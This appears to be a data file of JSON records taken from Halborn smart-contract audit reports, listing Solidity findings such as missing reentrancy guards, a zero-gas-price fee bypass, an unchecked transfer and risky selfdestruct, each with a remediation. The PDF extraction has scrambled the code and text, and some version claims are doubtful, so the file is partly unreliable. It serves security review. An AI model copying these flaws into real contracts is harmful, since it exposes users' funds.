LiquidityProviders . removeLiquidity () 12 LiquidityProviders . claimFee () Risk Level: Likelihood - 2 Impact - 2 29 Recommendation: The functions on the code location section have missing nonReentrant modifiers. It is recommended to add OpenZeppelin ReentrancyGuard library to the project and use the nonReentrant modifier to avoid introducing future re-entrancy vulnerabilities. Remediation Plan: SOLVED: This vulnerability was eliminated by adding the nonReentrant modifier to functions mentioned above. Commit ID: e511a8a02ab298526689cef653c905b6b2d452e3 30 ", "labels": ["Halborn", "Biconomy_Hyphen_V2", "Severity: Low"]}, {"title": "DISCREPANCY ON FUNCTION NAMING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The setLiquidtyPool function on the LPToken contract is named incon- Similarly, there is a setLiquidityPool function on the sistently. As LiquidityProviders contract which uses LiquidityPool as argument. a result of the function named in this way in the LPToken contract, if the contract owner gives the LiquidityPool address as an argument instead of the LiquidityProvider address, the transactions on the contract do not work properly. Code Location: Listing 11: LiquidityProviders.sol 138 function setLiquidityPool ( address _liquidityPool ) external  onlyOwner { 139 140 } liquidityPool = ILiquidityPool ( _liquidityPool ); Listing 12: LPToken.sol 45 function setLiquidtyPool ( address _lpm ) external onlyOwner { 46 47 48 liquidityPoolAddress = _lpm ; emit LiquidityPoolUpdated ( _lpm ); } Risk Level: Likelihood - 2 Impact - 2 31 Recommendation: It is recommended to rename LPTokens setLiquidtyPool function. Remediation Plan: SOLVED: This issue was solved after renaming the setLiquidtyPool function to setLiquidityProviders. Commit ID: 9e16cd0e6b6e66d5f02792d0705149c873daf287 32 ", "labels": ["Halborn", "Biconomy_Hyphen_V2", "Severity: Low"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The project contains many instances of floating pragma. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too recent which has not been extensively tested. Code Location: Listing 13: Floating Pragma 1 LiquidityProviders . sol :: pragma solidity ^0.8.0 2 WhitelistPeriodManager . sol :: pragma solidity ^0.8.0 3 LPToken . sol :: pragma solidity ^0.8.0 4 ERC2771Context . sol :: pragma solidity ^0.8.0 5 ERC2771ContextUpgradeable . sol :: pragma solidity ^0.8.0 6 ILPToken . sol :: pragma solidity ^0.8.0 7 ILiquidityPool . sol :: pragma solidity ^0.8.0 8 ILiquidityProviders . sol :: pragma solidity ^0.8.0 9 ITokenManager . sol :: pragma solidity ^0.8.0 10 IWhitelistPeriodManager . sol :: pragma solidity ^0.8.0 11 LpTokenMetadata . sol :: pragma solidity ^0.8.0 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider locking the pragma version with known bugs for the compiler When possible, do not use version by removing the caret (^) symbol. 33 floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Remediation Plan: SOLVED: The Biconomy team solved this issue by locking pragma versions. Commit ID: d7ca2d430b08296b742db3d0c39cc0dfa7201330 34 ", "labels": ["Halborn", "Biconomy_Hyphen_V2", "Severity: Low"]}, {"title": "LACK OF ADDRESS CONTROL ON ADDEXECUTOR FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "According to the performed tests, it is possible to add the same executor to the executors array multiple times. Adding the same address to the executor array does not pose a security risk since the remove function works properly. However, it is the best practice to keep unique elements in executors array. Code Location: Listing 14: ExecutorManager.sol require ( executorAddress != address (0) , \" executor address 37 function addExecutor ( address executorAddress ) public override  onlyOwner { 38  can not be 0 \"); 39 40 41 42 executors . push ( executorAddress ); executorStatus [ executorAddress ] = true ; emit ExecutorAdded ( executorAddress , msg . sender ); } Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to implement an additional check to addExecutors func- tion. Other possible solution would be defining the executors array as a mapping. 35 Remediation Plan: SOLVED: This finding was solved after a sanity check was added to the code to check not to add duplicate records to the array. Commit ID: e15fffa2aa3c79a9b2729a7e081737856a632317 36 3.10 (HAL-10) USE OF SEND PATTERN INSTEAD OF CALL.VALUE - INFORMATIONAL ", "labels": ["Halborn", "Biconomy_Hyphen_V2", "Severity: Informational"]}, {"title": "IMPROPER KEY MANAGEMENT POLICY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf", "body": "The very basics of Blockchain is decentralization which should be applied as much as possible in all processes around Blockchain, such as key management. If a single private key is used to manage control over the smart contract and perform some actions such as deploy or upgrade a Smart However if some how the private key has been compromised, Contract. For example, on March 5, it could lead to devastating consequences. 2021, the PAID Network smart contract was attacked, regardless of the smart contract was audited before. Approximately $100 million of PAID token were extracted by the attacker. In that case, the private key was compromised and the attacker had successfully upgraded and replaced the original smart contract with a malicious version that allowed tokens to be burned and minted. Thus, if best practices had been implemented in the key management policy, the attacked could not upgrade the contract using a single private key because it needed one more key to perform any action over the contract with a multi-signature implementation. Including multi- signature in the key management policy avoid that any critical action over the contract can be performed by a single user. Reference: https://halborn.com/explained-the-paid-network-hack-march-2021/ Risk Level: Likelihood - 5 Impact - 5 Recommendations: It is recommended to include multi-signature in the key management policy in order to avoid the risk of losing control over the smart contract because of the private key being compromised. 13 Remediation Plan: After reviewing the findings and associated risks, Polkadex team doesnt consider necessary to use a multi-signature wallet for key management policy and they will store the deployers private key in a hardware wallet. 14 ", "labels": ["Halborn", "Polkadex_SmartContract_Halborn", "Severity: Critical"]}, {"title": "IMPROPER ROLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf", "body": "In smart contracts, implementing a correct Access Control policy is an essential step to maintain security and decentralization for permissions on a token. All the features of the smart contract , such as mint/burn tokens and pause contracts are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless,other authorization levels are required to follow the principle of least privilege, also known as least authority. Briefly, any process, user or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. Therefore, there could be multiple roles such as manager, minter, admin, or pauser in contracts which use a proxy contract. In dex.sol contract, Owner is the only one privileged role. Owner can transfer the contract ownership, call selfdestruct function and disable transfers of the token. In conclusion, owner role can do too many actions in Polkadex smart contract. So, if the private key of the owner account is compromised and multi-signature was not implemented, the attacker can perform many actions such as transferring ownership or destruct the contract without following the principle of least privilege. Code Location: Owner role can access below functions: dex.sol Lines #34-36 15 dex.sol Lines #38-40 dex.sol Lines #46-48 Risk Level: Likelihood - 4 Impact - 4 Recommendation: Its recommended to use role-based access control based on the principle of least privilege to lock permissioned functions using different roles. Reference: https://www.cyberark.com/what-is/least-privilege/ Remediation Plan: Polkadex team removed the privileged functions DestructToken() and disable () in their last commit c00b1ed5d53b27f02f29cb37777bd494eb5b9c21. The only privileged function left is TransferOwnerShip. Then, the issue was 16 solved. 17 ", "labels": ["Halborn", "Polkadex_SmartContract_Halborn", "Severity: High"]}, {"title": "USE OF SELFDESTRUCT FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf", "body": "After the Parity Bug incident in 2017, the use of the selfdestruct func- tion began to stop being used. In addition, if selfdestruct function is implemented in a smart contract without a proper access control pol- icy, any attacker can self-destruct the contract if the private key is compromised. References: - https://swcregistry.io/docs/SWC-106 - SEC554: How to lose $280 million with a single line of code Code Location: dex.sol Line #35 Risk Level: Likelihood - 3 Impact - 5 Recommendations: It is recommended not to use the selfdestruct function. If the use of this function is absolutely necessary, a multi-signature address will be required to approve the action of self destruct the contract and one role can only execute this action. 18 Remediation Plan: Polkadex team removed the DestructToken() function in their last commit c00b1ed5d53b27f02f29cb37777bd494eb5b9c21. 19 ", "labels": ["Halborn", "Polkadex_SmartContract_Halborn", "Severity: High"]}, {"title": "NO TEST COVERAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf", "body": "Unlike other software programs, smart contracts can not be modified or removed if deployed once into a specific address except if you deploy Checking the code by automated testing them with a proxy contract. (unit testing or functional testing) is a good practice to be sure all lines of the code work correctly. Mocha and Chai are useful tools to perform unit test in Smart Contracts functions. Mocha is a Javascript testing framework for creating both synchronous and asynchronous unit tests. Moreover, Chai is an assertions library with some interfaces such as assert, expect and should to develop custom unit tests. References: - https://github.com/mochajs/mocha - https://github.com/chaijs/chai - https://docs.openzeppelin.com/learn/writing-automated-tests Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended considering to perform as much as possible test cases to cover all possible scenarios in the smart contract. Remediation Plan: Pending: Polkadex team will include test cases in future release. 20 ", "labels": ["Halborn", "Polkadex_SmartContract_Halborn", "Severity: Medium"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf", "body": "Polkadex contract uses the floating pragma 0.7.6. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma version that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. Code Location: dex.sol Line #~1 Reference: ConsenSys Diligence - Lock pragmas Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider lock the pragma version known bugs for the compiler version. Therefore, it is recommended not to use floating pragma in the produc- tion.. Apart from just locking the pragma version in the code, the caret () need to be removed. it is possible locked the pragma fixing the version both in truffle-config.js if you use the Truffle framework and 21 in hardhat.config.js if you use HardHat framework for the deployment. Remediation plan: Solved: c00b1ed5d53b27f02f29cb37777bd494eb5b9c21. Polkadex locked team the pragma in their last commit 22 ", "labels": ["Halborn", "Polkadex_SmartContract_Halborn", "Severity: Low"]}, {"title": "USE OF BLOCK.NUMBER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf", "body": "During a manual static review, the tester noticed the use of block.number. Sometimes, Contract developers should be aware that using block.timestamp and block.number does not mean current time. block.number can be also influenced (to a lesser extent) by miners, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Code Location: dex.sol Line #12 dex.sol Line #23 Risk Level: Likelihood - 1 Impact - 2 23 Recommendation: If possible, it is recommended to use oracles instead of block.number as a source of entropy and random number. Remediation Plan: Solved: timescales will occur across 3 months rather than seconds. In this case, the use of block.number is safe since their ", "labels": ["Halborn", "Polkadex_SmartContract_Halborn", "Severity: Informational"]}, {"title": "PRAGMA VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf", "body": "Polkadex contract uses one of the latest pragma version (0.7.6) which The latest pragma version is was released back in December 16, 2020. (0.8.2) and it was released in March 2021. Many pragma versions have been lately released, going from version 0.6.x to the recently released version 0.8.x. in just 6 months. Reference: https://github.com/ethereum/solidity/releases Code Location: dex.sol Line #2 24 Risk Level: Likelihood - 1 Impact - 2 Recommendation: In the Solitidy Github repository, there is a json file describe all bugs reported for each compiler versions. No bugs have been found in > 0.7.3 versions but very few in 0.7.0 -- 0.7.3. So, the latest stable version is pragma 0.6.12. Furthermore, pragma 0.6.12 is widely used by Solidity developers and has been extensively tested in many security audits. Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_ by_version.json Remediation Plan: Polkadex team accepts the use of pragma version 0.7.6. 25 ", "labels": ["Halborn", "Polkadex_SmartContract_Halborn", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf", "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: dex.sol Line #15 dex.sol Line #34 dex.sol Line #38 26 dex.sol Line #42 dex.sol Line #46 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions while external functions only can be accessed externally. Remediation Plan: Polkadex team considers proper the use of public functions in the smart contract. 27 ", "labels": ["Halborn", "Polkadex_SmartContract_Halborn", "Severity: Informational"]}, {"title": "DOCUMENTATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polkadex_SmartContract_Halborn_Report_v1_1.pdf", "body": "Documentation provided by Polkadex team is not complete. For instance, the documentation included in the GitHub repository should include a walkthrough to deploy and test the smart contracts. Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider updating the documentation in Github for greater ease when contracts are deployed and tested. Have a Non-Developer or QA resource work through the process to make sure it addresses any gaps in the set-up steps due to technical assumptions. Remediation Plan: Pending: Polkadex team will include documentation in future release. 28 3.10 STATIC ANALYSIS REPORT ", "labels": ["Halborn", "Polkadex_SmartContract_Halborn", "Severity: Informational"]}, {"title": "USERS CAN MANIPULATE THE TRANSFER FEE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The _feeTransferHandler function calculates gas charge for transfers. It uses the following mathematical operation to calculate the charge: Listing 1 1 tokenGasPrice . mul ( executionGas ). mul ( feeMultiplier ). div (10000) ; According to this function, the charge result could be 0 if users supply one of the tokenGasPrice, executionGas or feeMultiplier values as 0 while using the external transfer() function. Also, it is not possible to manipulate feeMultiplier variable to 0 without having admin privileges. In addition, it is not possible to manipulate executionGas variable since it is using the gasleft() function second time while calculating the executionGas variable. However. Any user can set tokenGasPrice variable to 0 while using the transfer() function. As a result, the charge will be zero since 0.mul(executionGas).mul(feeMultiplier).div(10000) equals to 0 and token will not be charged during the transfer. Code Location: Listing 2: TransferHandlerCustom.sol (Lines 193) 191 function _feeTransferHandler ( uint256 tokenGasPrice , address _payer , address token , uint256 executionGas ) internal returns ( uint256 charge ){ 192 193 194 195 // optional checks if token is allowed could be added charge = tokenGasPrice . mul ( executionGas ). mul ( feeMultiplier ). div (10000) ; // Needs safe transfer from to support USDT SafeERC20 . safeTransferFrom ( IERC20 ( token ) , _payer , feeReceiver , charge ) SafeERC20 . safeTransferFrom ( IERC20 ( token ) , _payer , feeReceiver , charge ); 13 196 197 198 199 200 } /* require ( IERC20 ( token ) . transferFrom ( _payer , feeReceiver , charge )) ; */ Recommendation: There is a pre-flight check for controlling the tokenGasPrice variable on the JS side. However, these controls are also should be applied to the related contract. It is recommended to implement a zero value check to the control for validating the tokenGasPrice variable. Remediation Plan: SOLVED: Biconomy Team implemented an additional security check which interacts with the Price Oracle. This new check controls the tokenGasPrice value if tokenGasPrice is 0 or not. It has been observed that this new implementation resolved the issue. 14 ", "labels": ["Halborn", "Biconomy_TransferHandler", "Severity: Medium"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The Owner of the contract is usually the account that deploys the contract. As a result, the Owner is able to perform some privileged functions like In the TransferHandlerCustom. setFeeReceiver(), setBaseGas() and etc. sol smart contract, the renounceOwnership function is used to renounce the Owner permission. Renouncing ownership before transferring would result in the contract having no Owner, eliminating the ability to call privileged functions. Risk Level: Likelihood - 3 Impact - 3 Code Location: Listing 3: TransferHandlerCustom.sol Ownable (Lines 12) 12 contract TransferHandlerCustom is EIP712MetaTransaction ( \" ERC20Transfer \" ,\" 1\" ) , Ownable { 13 14 ... Recommendation: It is recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. 15 Listing 4: Disable RenounceOwnership (Lines 1) 1 2 3 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \" ); // not possible with this smart contract } Remediation Plan: SOLVED: Biconomy Team replaced the default Ownable.sol library with the customized RenounceOwnership function. It has been confirmed by the Halborn Team that this vulnerability has been fixed. OwnableWithoutRenounce.sol eliminated library and 16 ", "labels": ["Halborn", "Biconomy_TransferHandler", "Severity: Medium"]}, {"title": "LACK OF ZERO ADDRESS CHECK ON CONSTRUCTOR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "For The TransferHandlerCustom.sol contract includes an Owner role. It is very example, the Owner role can change the baseGas value. Also, the Owner important to provide valid addresses to this role. role should be driven by people. There are too many address checks in the TransferHandlerCustom contract to keep this role safe. For example, it is not possible to set Owner or FeeReceiver addresses to address(0) after initialization of the contract. However, it is possible to set Owner address to address(0) because of the lack of address control on constructor. Risk Level: Likelihood - 2 Impact - 3 Code Location: Listing 5: TransferHandlerCustom.sol (Lines 54) 54 constructor ( address _owner ) public Ownable ( _owner ){ 55 } Recommendation: It is recommended to implement zero address check on constructor. 17 Remediation Plan: SOLVED: Biconomy Team solved this issue by implementing new zero address checks on the constructor. It is not possible to set owner or feeReceiver to address(0) anymore. It has been confirmed by the Halborn Team that this vulnerability has been fixed. 18 ", "labels": ["Halborn", "Biconomy_TransferHandler", "Severity: Low"]}, {"title": "IMPROPER IMPLEMENTATION OF FEE RECEIVER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Roles are used on the developed contracts to provide ease of use or to separate the tasks on the contract from each other. It is very important that these roles should be sharply separated from each other during the deployment phase of the contract and assigned to the right accounts. In some cases, unexpected conditions may occur as a result of incorrect programming of these roles. During the tests, it was seen that the Fee Receiver role on the TransferHandlerCustom.sol contract was not initialized on the constructor while deploying the contract. As a result of this situation, there will be no feeReceiver address on the contract and transactions will not be performed. Code Location: Listing 6: TransferHandlerCustom.sol (Lines 54) 54 constructor ( address _owner ) public Ownable ( _owner ){ 55 } Recommendation: It is recommended to implement the following code for the fees: Listing 7: TransferHandlerCustom.sol (Lines 54,55) 54 constructor ( address _owner , address _feeReceiver ) public Ownable ( _owner ){ require ( _feeReceiver != address (0) , 55 56 19 57 58 59 60 } \" Transfer Handler : the fee receiver can not be a zero address \" ); feeReceiver = _feeReceiver ; Remediation Plan: SOLVED: It has been confirmed by the Halborn Team that this vulnerability has been fixed due to the Biconomy Team applied the recommendation on the constructor. 20 ", "labels": ["Halborn", "Biconomy_TransferHandler", "Severity: Low"]}, {"title": "EXPERIMENTAL FEATURES ENABLED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "ABIEncoderV2 is enabled and the use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(...) as arguments in external function calls or in event data without prior assignment to a local variable. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Risk Level: Likelihood - 1 Impact - 2 Code Location: Listing 8: TransferHandlerCustom.sol (Lines 3) 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.0; 3 pragma experimental ABIEncoderV2 ; Recommendation: When possible, do not use experimental features in the final live deployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). 21 Remediation Plan: SOLVED: Biconomy Team solved this issue by removing pragma experimental ABIEncoderV2 from the contract. It has been confirmed by the Halborn Team that this vulnerability has been fixed. 22 ", "labels": ["Halborn", "Biconomy_TransferHandler", "Severity: Informational"]}, {"title": "PRAGMA VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The TransferHandlerCustom.sol contract uses one of the newest pragma versions (0.8.0), which was released on March 10, 2020. Since this version is not one of the generally used reliable versions, we do not recommend using it. It is recommended to use an older but secure version, as this version is a newer version and there may still be new security vulnerabilities on it. Code Location: Listing 9: TransferHandlerCustom.sol (Lines 2) 2 pragma solidity 0.8.0; Recommendation: In the Solidity Github repository, there is a json file listing the bugs reported for each compiler version. A security vulnerability has been found in the pragma version 0.7.6. The latest stable version is pragma 0.6.12. Furthermore, pragma 0.6.12 is widely used by Solidity developers and has been extensively tested in many security audits. We recommend using the latest stable version. Please check the list below: https://github.com/ethereum/solidity/blob/develop/docs/bugs_by_version. json Remediation Plan: ACKNOWLEDGED: Biconomy Team decided to continue using pragma 0.8.0 and accepts the risk. 23 ", "labels": ["Halborn", "Biconomy_TransferHandler", "Severity: Informational"]}, {"title": "MISSING EVENTS EMITTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_TransferHandler_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "It has been observed that critical functionality is missing emitting event for setDefaultFeeMultiplier and setFeeReceiver functions. These functions should emit events after completing the transactions. Risk Level: Likelihood - 1 Impact - 1 Code Location: Listing 10: TransferHandlerCustom.sol 57 function setDefaultFeeMultiplier ( uint16 _bp ) external onlyOwner { 58 require ( _bp <= maximumMarkup , \" fee multiplier is too high \" ); feeMultiplier = _bp ; 59 60 } Listing 11: TransferHandlerCustom.sol 62 function setFeeReceiver ( address _feeReceiver ) external onlyOwner { 63 64 65 _feeReceiver != address (0) , \" Transfer Handler : new fee receiver can not be a zero require ( address \" ); feeReceiver = _feeReceiver ; 66 67 68 } 24 Recommendation: Consider emitting an event when calling setDefaultFeeMultiplier and setFeeReceiver functions. Listing 12 1 event setDefaultFeeMultiplier ( uint16 _bp ); 2 event setFeeReceiver ( address _feeReceiver ); Remediation Plan: SOLVED: Biconomy Team solved this issue by implementing new events and emitting these events on the necessary functions. It has been seen by the Halborn team that the specified vulnerability has been fixed. 25 ", "labels": ["Halborn", "Biconomy_TransferHandler", "Severity: Informational"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In contract SpheriumRouter01.sol and SpheriumRouter02.sol the return val- ues of an external transfer call ISpheriumPair(pair).transferFrom(msg. sender, pair, liquidity) is not checked. It should be noted that token do not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location: Listing 2: periphery-bsc/contracts/SpheriumRouter01.sol (Lines 108) 98 99 100 101 102 103 104 105 106 107 108 109 110 function removeLiquidity ( address tokenA , address tokenB , uint liquidity , uint amountAMin , uint amountBMin , address to , uint deadline ) public override ensure ( deadline ) returns ( uint amountA , uint amountB ) { address pair = SpheriumLibrary . pairFor ( factory , tokenA , tokenB ); ISpheriumPair ( pair ). transferFrom ( msg . sender , pair , liquidity ); // send liquidity to pair ( uint amount0 , uint amount1 ) = ISpheriumPair ( pair ). burn ( to ); ( address token0 ,) = SpheriumLibrary . sortTokens ( tokenA , tokenB ); Listing 3: periphery-bsc/contracts/SpheriumRouter02.sol (Lines 126) 116 117 function removeLiquidity ( address tokenA , 16 118 119 120 121 122 123 124 125 126 127 address tokenB , uint liquidity , uint amountAMin , uint amountBMin , address to , uint deadline ) public virtual override ensure ( deadline ) returns ( uint amountA , uint amountB ) { address pair = SpheriumLibrary . pairFor ( factory , tokenA , tokenB ); ISpheriumPair ( pair ). transferFrom ( msg . sender , pair , liquidity ); // send liquidity to pair ( uint amount0 , uint amount1 ) = ISpheriumPair ( pair ). burn ( to ); Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to use SafeERC20, or ensure that the transfer return value is checked. Remediation Plan: SOLVED: solved d87fb122b5d168ee90a324c1a1e664e3019caf. Spherium team The the issue in commit 64 17 ", "labels": ["Halborn", "Spherium_Hyperswap", "Severity: Medium"]}, {"title": "MANIPULATION OF INITIAL TOKEN ADDRESSES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "a it was manual review, observed contract During SpheriumPair.sol allows a factory user to initialize token0 and token1 at any time by making an external call. Malicious activity can be done to manipulate the functions within the contract i.e. sync, skim, swap, burn, and mint and the intended operation can be bypassed because all these functions has a dependency on token0 and token1. core-bsc that Code Location: Malicious initialization of token0 and token1 at anytime by factory. Listing 4: core-bsc/contracts/SpheriumPair.sol (Lines 67,69,70) 62 63 64 65 66 67 68 69 70 71 constructor () public { factory = msg . sender ; } // called once by the factory at time of deployment function initialize ( address _token0 , address _token1 ) external { require ( msg . sender == factory , ' Spherium : FORBIDDEN '); // sufficient check token0 = _token0 ; token1 = _token1 ; } Affected token transfer, mint, balance update, and burn Listing 113,114,139,140,149,150,151,152,171,172,174,175,194,195,200) core-bsc/contracts/SpheriumPair.sol 5: (Lines 111 function mint ( address to ) external lock returns ( uint liquidity ) { 18 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 ( uint112 _reserve0 , uint112 _reserve1 ,) = getReserves () ; // gas savings uint balance0 = IERC20 ( token0 ). balanceOf ( address ( this )); uint balance1 = IERC20 ( token1 ). balanceOf ( address ( this )); uint amount0 = balance0 . sub ( _reserve0 ); uint amount1 = balance1 . sub ( _reserve1 ); bool feeOn = _mintFee ( _reserve0 , _reserve1 ); uint _totalSupply = totalSupply ; // gas savings , must be defined here since totalSupply can update in _mintFee if ( _totalSupply == 0) { liquidity = Math . sqrt ( amount0 . mul ( amount1 )) . sub ( MINIMUM_LIQUIDITY ); _mint ( address (0) , MINIMUM_LIQUIDITY ); // permanently lock the first MINIMUM_LIQUIDITY tokens } else { liquidity = Math . min ( amount0 . mul ( _totalSupply ) / _reserve0 , amount1 . mul ( _totalSupply ) / _reserve1 ); } require ( liquidity > 0, ' Spherium : INSUFFICIENT_LIQUIDITY_MINTED '); _mint ( to , liquidity ); _update ( balance0 , balance1 , _reserve0 , _reserve1 ); if ( feeOn ) kLast = uint ( reserve0 ). mul ( reserve1 ); // reserve0 and reserve1 are up - to - date emit Mint ( msg . sender , amount0 , amount1 ); } // this low - level function should be called from a contract which performs important safety checks function burn ( address to ) external lock returns ( uint amount0 , uint amount1 ) { ( uint112 _reserve0 , uint112 _reserve1 ,) = getReserves () ; // gas savings address _token0 = token0 ; // gas savings address _token1 = token1 ; // gas savings uint balance0 = IERC20 ( _token0 ). balanceOf ( address ( this )) ; uint balance1 = IERC20 ( _token1 ). balanceOf ( address ( this )) ; uint liquidity = balanceOf [ address ( this ) ]; bool feeOn = _mintFee ( _reserve0 , _reserve1 ); 19 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 uint _totalSupply = totalSupply ; // gas savings , must be defined here since totalSupply can update in _mintFee amount0 = liquidity . mul ( balance0 ) / _totalSupply ; // using balances ensures pro - rata distribution amount1 = liquidity . mul ( balance1 ) / _totalSupply ; // using balances ensures pro - rata distribution require ( amount0 > 0 && amount1 > 0, ' Spherium : INSUFFICIENT_LIQUIDITY_BURNED '); _burn ( address ( this ) , liquidity ); _safeTransfer ( _token0 , to , amount0 ); _safeTransfer ( _token1 , to , amount1 ); balance0 = IERC20 ( _token0 ). balanceOf ( address ( this )) ; balance1 = IERC20 ( _token1 ). balanceOf ( address ( this )) ; _update ( balance0 , balance1 , _reserve0 , _reserve1 ); if ( feeOn ) kLast = uint ( reserve0 ). mul ( reserve1 ); // reserve0 and reserve1 are up - to - date emit Burn ( msg . sender , amount0 , amount1 , to ); } // this low - level function should be called from a contract which performs important safety checks function swap ( uint amount0Out , uint amount1Out , address to , bytes calldata data ) external lock { require ( amount0Out > 0 || amount1Out > 0, ' Spherium : INSUFFICIENT_OUTPUT_AMOUNT '); ( uint112 _reserve0 , uint112 _reserve1 ,) = getReserves () ; // gas savings require ( amount0Out < _reserve0 && amount1Out < _reserve1 , ' Spherium : INSUFFICIENT_LIQUIDITY '); uint balance0 ; uint balance1 ; { // scope for _token {0 ,1} , avoids stack too deep errors address _token0 = token0 ; address _token1 = token1 ; require ( to != _token0 && to != _token1 , ' Spherium : INVALID_TO '); if ( amount0Out > 0) _safeTransfer ( _token0 , to , amount0Out ) ; // optimistically transfer tokens if ( amount1Out > 0) _safeTransfer ( _token1 , to , amount1Out ) ; // optimistically transfer tokens if ( data . length > 0) ISpheriumCallee ( to ). spheriumCall ( msg . sender , amount0Out , amount1Out , data ); 20 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 